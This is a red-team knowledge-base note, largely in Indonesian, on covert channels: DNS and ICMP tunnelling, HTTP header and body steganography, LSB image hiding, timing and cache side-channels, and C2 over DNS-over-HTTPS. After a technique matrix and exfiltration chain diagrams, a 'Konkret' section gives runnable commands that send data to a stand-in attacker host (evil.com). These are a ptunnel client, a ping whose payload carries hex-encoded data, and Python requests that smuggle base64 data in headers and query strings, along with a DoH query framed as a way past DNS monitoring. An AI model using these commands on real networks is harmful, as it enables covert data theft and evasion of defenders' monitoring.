---
title: Attack Perspective — Covert Channel (Red Team)
tags:
- attack
- red-team
- covert-channel
- dns
- icmp
- http-stego
- lsb
- side-channel
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  
---

# Covert Channel — Perspektif Penyerang

> Covert channel = komunikasi tersembunyi dalam traffic legit. Red team: DNS tunneling, ICMP payload, HTTP header stego, LSB image embedding, timing-based channel, side-channel (cache).

## 1. Covert Channel Matrix

| Channel | Carrier | MITRE ID | Teknik | Evasion | Detection Gap |
|---------|---------|----------|--------|---------|----------------|
| **DNS** | DNS query/response | T1071.004 | dnscat2, iodine | High entropy = mimic CDN | DNS entropy = threshold |
| **ICMP** | ICMP payload | T1571 | icmptunnel, ptunnel | Mimic ping (size/rate) | IDS jarang inspect ICMP payload |
| **HTTP Header** | Custom header, cookie, UA | T1071.001 | X-Header, cookie stego | Header = legit format | Header deep inspect = rare |
| **HTTP Body** | JSON/HTML comment stego | T1071.001 | Comment embedding, JSON field | Body = legit content | Body semantic check = rare |
| **Image LSB** | Image least-significant bit | T1027.003 | Steghide, openstego | Image = visually identical | LSB detect = statistical |
| **Audio stego** | Audio LSB/phase | T1027.003 | DeepSound, MP3Stego | Audio = audibly identical | Audio stego detect = rare |
| **Timing** | Packet timing pattern | T1573 | Custom timing encode | Timing = network jitter noise | Timing analysis = statistical |
| **Side-channel (cache)** | Cache timing covert | T1573 | Flush+Reload, Prime+Probe | Hardware = no packet | Cache monitor = rare |
| **Social media** | Post/comment/commit | T1102 | GitHub commit, Twitter DM | Legit platform traffic | Platform API audit = rare |
| **Cloud API** | Cloud storage object | T1102 | S3 object, Blob storage | Cloud API = legit | Cloud API = rare |

## 2. DNS Covert Channel Chain

```
Setup: Attacker DNS server + domain (attacker.com)
    ↓
Client (target):
  ├── Encode data → base32/base64
  ├── Query: [encoded].c2.attacker.com
  ├── Server respond: TXT record → command
  └→ Bidirectional: query = data in, TXT = data out
    ↓
Exfil:
  ├── Chunk data → DNS query per chunk
  ├── Rate: slow (1 query/30s) → below threshold
  └→ Total: full file exfil via DNS
    ↓
Detection: DNS entropy (random-looking subdomain) → but:
  ├── Legit CDN/telemetry juga random → false positive
  └→ Threshold tuning → attacker below threshold
```

## 3. HTTP Stego Chain

```
Channel: Legitimate HTTPS traffic (web app)
    ↓
Embedding:
  ├── Header: X-Custom-Header → base64 data
  ├── Cookie: session cookie → extra field
  ├── User-Agent: append data
  └── Body: JSON comment, HTML comment, whitespace
    ↓
Exfil:
  ├── Each request → small chunk
  ├── Rate: match normal user activity
  └→ Total: data exfil over days (stealth)
    ↓
Evasion: Header = valid format, no anomaly (if crafted well)
```

## 4. Tool Stack

| Tool | Use |
|------|-----|
| **dnscat2 / iodine** | DNS tunnel |
| **icmptunnel / ptunnel** | ICMP tunnel |
| **steghide / openstego** | Image LSB stego |
| **DeepSound / MP3Stego** | Audio stego |
| **Chisel / ligolo-ng** | TCP tunnel (HTTP/WebSocket) |
| **Custom Python** | HTTP header/cookie stego |

## 5. Referensi
- dnscat2 — https://github.com/iagox86/dnscat2
- iodine — https://github.com/yarrick/iodine
- steghide — https://steghide.sourceforge.net/
- Covert Channels (book) — https://www.amazon.com/Covert-Channels...
- CWE-385 (Covert Timing) — https://cwe.mitre.org/data/definitions/385.html

## Konkret — Covert Channel Payload (Testable)

### ICMP Tunneling (ping)

```bash
# Server (attacker): PINGTUNNEL
ptunnel                        # listen ICMP
# Client (target):
ptunnel -p evil.com -daemon   # connect via ICMP

# Atau manual: exfil via ping payload
# Setiap ping: data 32 byte di ICMP echo data
ping -c 1 -s 100 -p $(echo -n "exfil" | xxd -p) evil.com
# Server: tcpdump 'icmp' → capture payload
```

### HTTP Steganography (Header/Body)

```python
# Exfil via HTTP header
import requests
data = "exfil_data"
b64 = base64.b64encode(data.encode()).decode()
requests.get(f"https://evil.com/api?v={b64}",
             headers={"X-Token": b64})  # backup kanal

# Body steganography: sisipkan di JSON padding
{"user": "admin", "padding": "AAAAexfil_data"}
# Server: parse JSON, baca "padding" field
```

### LSB Image Steganography

```bash
# Tool: steghide
# Embed:
steghide embed -cf cover.jpg -ef secret.txt -p password
# Extract:
steghide extract -sf cover.jpg -p password -xf secret.txt

# zsteg (PNG/BMP auto detect)
zsteg cover.png

# Contoh exfil: embed ke timestamp watermark
# Screenshot blog/buy site → upload ke CDN → ekstrak di server
```

### DNS over HTTPS (DoH) C2

```bash
# DoH query → bypass DNS monitoring
# curl ke Google DoH endpoint
curl -H "accept: application/dns-json" "https://dns.google/resolve?name=evil.com&type=TXT"
# C2: encode data sebagai TXT query terus ping DoH Google/Cloudflare
# NIDS lihat HTTPS traffic ke dns.google = legitimate
```
---

audited
---
